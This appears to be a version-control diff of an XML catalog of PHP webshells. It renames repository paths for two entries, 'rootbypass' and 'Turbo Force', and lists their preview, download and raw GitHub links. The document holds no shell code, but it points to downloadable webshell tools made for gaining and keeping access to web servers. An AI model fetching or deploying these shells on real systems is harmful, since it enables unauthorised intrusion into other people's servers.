-      <image>https://adilhyz.github.io/webshell/preview/rootbypass.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/rootbypass.webp</image>
       <size>1kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/rootbypass.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/rootbypass.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/rootbypass.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/rootbypass.php</raw>
     </item>
     <item>
       <name>Turbo Force</name>
-      <image>https://adilhyz.github.io/webshell/preview/turboforce.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/turboforce.webp</image>
       <size>1kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/turboforce.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/turboforce.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/turboforce.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/turboforce.php</raw>
     </item>
   </category>
 </webshells>
